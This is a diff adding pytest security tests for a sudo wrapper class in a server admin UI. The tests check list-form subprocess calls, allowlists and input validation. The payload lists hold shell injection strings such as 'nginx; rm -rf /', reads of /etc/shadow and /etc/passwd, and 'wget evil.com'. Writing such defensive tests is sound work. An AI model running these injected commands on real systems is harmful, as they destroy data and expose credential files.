@@ -2069,3 +2069,444 @@ class TestPostfixMethods:
             wrapper.get_postfix_logs(lines=0)
         args_called = mock_run.call_args[0][0]
         assert "1" in args_called
+
+
+# ===========================================================================
+# TestSecurityShellInjection: shell injection 防御のテスト（CLAUDE.md セキュリティ要件）
+# ===========================================================================
+
+
+class TestSecurityShellInjection:
+    """shell injection 文字を含む入力が安全に処理されることを確認
+
+    CLAUDE.md 要件:
+    - subprocess.run は常にリスト形式で呼ばれる（shell=True 禁止）
+    - 特殊文字を含む引数はそのまま配列要素として渡される
+    """
+
+    INJECTION_PAYLOADS = [
+        "nginx; rm -rf /",
+        "nginx | cat /etc/passwd",
+        "nginx & wget evil.com",
+        "nginx$(whoami)",
+        "nginx`id`",
+        "nginx > /tmp/pwned",
+        "nginx < /etc/shadow",
+        'nginx"$(whoami)"',
+        "nginx'$(id)'",
+        "nginx && cat /etc/shadow",
+        "nginx || true",
+        "nginx\nnewcommand",
+        "nginx\x00null",
+    ]
+
+    def _make_wrapper(self, tmp_path, *scripts):
+        """テスト用ラッパーを作成"""
+        (tmp_path / "adminui-status.sh").touch()
+        for s in scripts:
+            (tmp_path / s).touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    def _mock_result(self):
+        m = MagicMock()
+        m.stdout = json.dumps({"status": "ok"})
+        return m
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
+    def test_execute_passes_args_as_list_not_shell(self, tmp_path, payload):
+        """_execute が引数をリスト形式で渡し、shell=True を使わないことを確認"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper._execute("adminui-status.sh", [payload])
+
+        # subprocess.run の呼び出し検証
+        call_args = mock_run.call_args
+        cmd = call_args[0][0]
+        kwargs = call_args[1] if len(call_args) > 1 else call_args.kwargs
+
+        # コマンドがリスト形式であること
+        assert isinstance(cmd, list), "cmd must be a list, not a string"
+        # shell=True が使われていないこと
+        assert kwargs.get("shell") is not True, "shell=True is forbidden"
+        # ペイロードがリストの1要素としてそのまま含まれていること
+        assert payload in cmd, "payload must be passed as a single list element"
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
+    def test_execute_with_stdin_passes_args_as_list(self, tmp_path, payload):
+        """_execute_with_stdin も引数をリスト形式で渡すことを確認"""
+        (tmp_path / "adminui-user-add.sh").touch()
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper._execute_with_stdin("adminui-user-add.sh", [payload], "stdin_data")
+
+        call_args = mock_run.call_args
+        cmd = call_args[0][0]
+        kwargs = call_args[1] if len(call_args) > 1 else call_args.kwargs
+
+        assert isinstance(cmd, list)
+        assert kwargs.get("shell") is not True
+        assert payload in cmd
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
+    def test_restart_service_injection_safe(self, tmp_path, payload):
+        """restart_service に injection ペイロードを渡しても安全であることを確認"""
+        wrapper = self._make_wrapper(tmp_path, "adminui-service-restart.sh")
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.restart_service(payload)
+
+        cmd = mock_run.call_args[0][0]
+        assert isinstance(cmd, list)
+        assert payload in cmd
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
+    def test_get_logs_injection_safe(self, tmp_path, payload):
+        """get_logs のサービス名に injection ペイロードを渡しても安全であることを確認"""
+        wrapper = self._make_wrapper(tmp_path, "adminui-logs.sh")
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_logs(payload)
+
+        cmd = mock_run.call_args[0][0]
+        assert isinstance(cmd, list)
+        assert payload in cmd
+
+
+# ===========================================================================
+# TestSecurityServerAllowlist: サーバー allowlist バイパステスト
+# ===========================================================================
+
+
+class TestSecurityServerAllowlist:
+    """サーバー allowlist が正しく機能し、バイパスできないことを確認"""
+
+    BYPASS_ATTEMPTS = [
+        "nginx; ls",
+        "apache2\x00extra",
+        "../etc/passwd",
+        "mysql --help",
+        "redis\nmalicious",
+        "NGINX",  # 大文字
+        " nginx",  # 先頭スペース
+        "nginx ",  # 末尾スペース
+        "postgresql\ttab",
+    ]
+
+    def _make_wrapper(self, tmp_path):
+        (tmp_path / "adminui-status.sh").touch()
+        (tmp_path / "adminui-servers.sh").touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
+    def test_get_server_status_rejects_bypass(self, tmp_path, server):
+        """get_server_status が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="Server not allowed"):
+            wrapper.get_server_status(server)
+
+    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
+    def test_get_server_version_rejects_bypass(self, tmp_path, server):
+        """get_server_version が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="Server not allowed"):
+            wrapper.get_server_version(server)
+
+    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
+    def test_get_server_config_info_rejects_bypass(self, tmp_path, server):
+        """get_server_config_info が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="Server not allowed"):
+            wrapper.get_server_config_info(server)
+
+
+# ===========================================================================
+# TestSecurityDbAllowlist: DB allowlist バイパステスト
+# ===========================================================================
+
+
+class TestSecurityDbAllowlist:
+    """DB type allowlist が正しく機能し、バイパスできないことを確認"""
+
+    BYPASS_ATTEMPTS = [
+        "mysql; ls",
+        "mongodb",
+        "sqlite",
+        "MYSQL",
+        " postgresql",
+        "mysql\x00extra",
+        "oracle",
+        "mssql",
+        "",
+    ]
+
+    def _make_wrapper(self, tmp_path):
+        (tmp_path / "adminui-status.sh").touch()
+        (tmp_path / "adminui-dbmonitor.sh").touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
+    def test_get_db_status_rejects_bypass(self, tmp_path, db_type):
+        """get_db_status が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="DB type not allowed"):
+            wrapper.get_db_status(db_type)
+
+    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
+    def test_get_db_processlist_rejects_bypass(self, tmp_path, db_type):
+        """get_db_processlist が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="DB type not allowed"):
+            wrapper.get_db_processlist(db_type)
+
+    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
+    def test_get_db_databases_rejects_bypass(self, tmp_path, db_type):
+        """get_db_databases が allowlist バイパス試行を拒否する"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="DB type not allowed"):
+            wrapper.get_db_databases(db_type)
+
+
+# ===========================================================================
+# TestSecurityHardwareSmart: SMART デバイスパス検証テスト
+# ===========================================================================
+
+
+class TestSecurityHardwareSmart:
+    """get_hardware_smart のデバイスパス検証が正しく動作することを確認"""
+
+    VALID_DEVICES = [
+        "/dev/sda",
+        "/dev/sdb",
+        "/dev/sdz",
+        "/dev/nvme0n0",
+        "/dev/nvme1n1",
+        "/dev/vda",
+        "/dev/xvda",
+        "/dev/hda",
+    ]
+
+    INVALID_DEVICES = [
+        "/dev/sda1",  # パーティション
+        "/dev/sda; rm -rf /",
+        "/dev/../etc/shadow",
+        "/tmp/sda",
+        "sda",
+        "/dev/",
+        "/dev/sd",
+        "/dev/nvme",
+        "/dev/sda\x00",
+        "/etc/passwd",
+        "",
+        "/dev/sda$(whoami)",
+        "/dev/sda`id`",
+    ]
+
+    def _make_wrapper(self, tmp_path):
+        (tmp_path / "adminui-status.sh").touch()
+        (tmp_path / "adminui-hardware.sh").touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    @pytest.mark.parametrize("device", VALID_DEVICES)
+    def test_valid_device_accepted(self, tmp_path, device):
+        """正当なデバイスパスが受け入れられること"""
+        wrapper = self._make_wrapper(tmp_path)
+        m = MagicMock()
+        m.stdout = json.dumps({"smart": {}})
+        with patch("subprocess.run", return_value=m):
+            # ValueError が発生しなければ OK
+            wrapper.get_hardware_smart(device)
+
+    @pytest.mark.parametrize("device", INVALID_DEVICES)
+    def test_invalid_device_rejected(self, tmp_path, device):
+        """不正なデバイスパスが拒否されること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with pytest.raises(ValueError, match="Invalid device path"):
+            wrapper.get_hardware_smart(device)
+
+
+# ===========================================================================
+# TestSecurityInterfaceValidation: インターフェース名バリデーションテスト
+# ===========================================================================
+
+
+class TestSecurityInterfaceValidation:
+    """_validate_iface のバリデーションが正しく動作することを確認"""
+
+    VALID_IFACES = [
+        "eth0",
+        "enp0s3",
+        "wlan0",
+        "br-docker0",
+        "veth123abc",
+        "lo",
+        "bond0.100",
+        "a",
+    ]
+
+    INVALID_IFACES = [
+        "",
+        "eth0; ls",
+        "eth0$(id)",
+        "eth0`whoami`",
+        "a" * 33,  # 33文字 (上限32)
+        "eth0 extra",  # スペース含む
+        "eth0\ttab",
+        "eth0\nnewline",
+        "eth0/slash",
+    ]
+
+    def test_valid_ifaces_accepted(self):
+        """正当なインターフェース名がバリデーションを通過する"""
+        wrapper = SudoWrapper.__new__(SudoWrapper)
+        for iface in self.VALID_IFACES:
+            # ValueError が発生しなければ OK
+            wrapper._validate_iface(iface)
+
+    @pytest.mark.parametrize("iface", INVALID_IFACES)
+    def test_invalid_ifaces_rejected(self, iface):
+        """不正なインターフェース名が拒否される"""
+        wrapper = SudoWrapper.__new__(SudoWrapper)
+        with pytest.raises(ValueError, match="Invalid interface name"):
+            wrapper._validate_iface(iface)
+
+
+# ===========================================================================
+# TestExecuteCommandStructure: コマンド構造の検証テスト
+# ===========================================================================
+
+
+class TestExecuteCommandStructure:
+    """_execute が生成するコマンドの構造を検証"""
+
+    def _make_wrapper(self, tmp_path, *scripts):
+        (tmp_path / "adminui-status.sh").touch()
+        for s in scripts:
+            (tmp_path / s).touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    def _mock_result(self):
+        m = MagicMock()
+        m.stdout = json.dumps({"status": "ok"})
+        return m
+
+    def test_command_starts_with_sudo(self, tmp_path):
+        """コマンドの先頭が 'sudo' であること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        cmd = mock_run.call_args[0][0]
+        assert cmd[0] == "sudo"
+
+    def test_command_second_element_is_wrapper_path(self, tmp_path):
+        """コマンドの2番目要素がラッパースクリプトのフルパスであること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        cmd = mock_run.call_args[0][0]
+        assert cmd[1] == str(tmp_path / "adminui-status.sh")
+
+    def test_check_true_is_set(self, tmp_path):
+        """subprocess.run に check=True が設定されていること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
+        assert kwargs.get("check") is True
+
+    def test_capture_output_is_set(self, tmp_path):
+        """subprocess.run に capture_output=True が設定されていること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
+        assert kwargs.get("capture_output") is True
+
+    def test_text_mode_is_set(self, tmp_path):
+        """subprocess.run に text=True が設定されていること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
+        assert kwargs.get("text") is True
+
+    def test_timeout_is_set(self, tmp_path):
+        """subprocess.run に timeout が設定されていること"""
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.get_system_status()
+
+        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
+        assert "timeout" in kwargs
+        assert kwargs["timeout"] > 0
+
+    def test_execute_with_stdin_has_input_kwarg(self, tmp_path):
+        """_execute_with_stdin で input kwarg が正しく設定されること"""
+        (tmp_path / "adminui-user-passwd.sh").touch()
+        wrapper = self._make_wrapper(tmp_path)
+        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
+            wrapper.change_user_password(username="alice", password_hash="$6$hash")
+
+        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
+        assert kwargs.get("input") == "$6$hash"
+
+
+# ===========================================================================
+# TestCalledProcessErrorStdoutFallback: CalledProcessError の stdout JSON フォールバック
+# ===========================================================================
+
+
+class TestCalledProcessErrorStdoutFallback:
+    """CalledProcessError 時に stderr=None, stdout=JSON の場合のフォールバックテスト"""
+
+    def _make_wrapper(self, tmp_path):
+        (tmp_path / "adminui-status.sh").touch()
+        return SudoWrapper(wrapper_dir=str(tmp_path))
+
+    def test_execute_stderr_none_stdout_json(self, tmp_path):
+        """stderr=None で stdout に JSON がある場合、stdout の JSON を返す"""
+        wrapper = self._make_wrapper(tmp_path)
+        error_data = {"status": "error", "code": "RESOURCE_BUSY"}
+        exc = subprocess.CalledProcessError(
+            returncode=1, cmd=[], stderr=None, output=json.dumps(error_data)
+        )
+
+        with patch("subprocess.run") as mock_run:
+            mock_run.side_effect = exc
+            result = wrapper._execute("adminui-status.sh", [])
+
+        assert result["status"] == "error"
+        assert result["code"] == "RESOURCE_BUSY"
+
+    def test_execute_with_stdin_stderr_none_stdout_json(self, tmp_path):
+        """_execute_with_stdin でも同様のフォールバックが機能する"""
+        (tmp_path / "adminui-user-add.sh").touch()
+        wrapper = self._make_wrapper(tmp_path)
+        error_data = {"status": "error", "code": "DUPLICATE_USER"}
+        exc = subprocess.CalledProcessError(
+            returncode=1, cmd=[], stderr=None, output=json.dumps(error_data)
+        )
+
+        with patch("subprocess.run") as mock_run:
+            mock_run.side_effect = exc
+            result = wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")
+
+        assert result["status"] == "error"
+        assert result["code"] == "DUPLICATE_USER"
+
+    def test_execute_stderr_empty_string_stdout_json(self, tmp_path):
+        """stderr='' で stdout に JSON がある場合のフォールバック"""
+        wrapper = self._make_wrapper(tmp_path)
+        error_data = {"status": "failed", "reason": "timeout"}
+        exc = subprocess.CalledProcessError(
+            returncode=1, cmd=[], stderr="", output=json.dumps(error_data)
+        )
+
+        with patch("subprocess.run") as mock_run:
+            mock_run.side_effect = exc
+            # stderr="" は falsy なので e.stdout が使われる
+            result = wrapper._execute("adminui-status.sh", [])
+
+        assert result["status"] == "failed"
